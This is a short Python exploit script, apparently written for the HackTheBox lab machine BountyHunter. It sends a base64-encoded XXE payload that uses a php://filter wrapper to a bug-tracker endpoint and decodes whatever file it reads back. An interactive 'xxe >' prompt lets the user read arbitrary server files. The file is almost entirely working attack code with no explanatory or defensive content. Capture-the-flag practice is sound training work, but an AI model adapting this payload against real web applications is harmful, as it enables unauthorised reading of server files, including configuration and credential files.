# This script is created to exploit the XXE vulnerability on the BountyHunter machine on HackTheBox

import requests
import base64
import sys
import cmd

def getFile(fname):
    # fname = sys.argv[1]
    payload = f"""<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={fname}"> ]>
                    <bugreport>
                    <title>&xxe;</title>
                    <cwe>Test2</cwe>
                    <cvss>1</cvss>
                    <reward>2</reward>
                    </bugreport>
                    """.encode()
    payload_b64 = base64.b64encode(payload)
    data = { "data":payload_b64 }
    r = requests.post("http://10.10.11.100/tracker_diRbPr00f314.php", data=data)
    output = (r.text).split('>')[5][:-4]
    return(base64.b64decode(output).decode())

class XxeLeak(cmd.Cmd):
    prompt = "xxe > "
    def default(self,args):
        print(getFile(args))

XxeLeak().cmdloop()
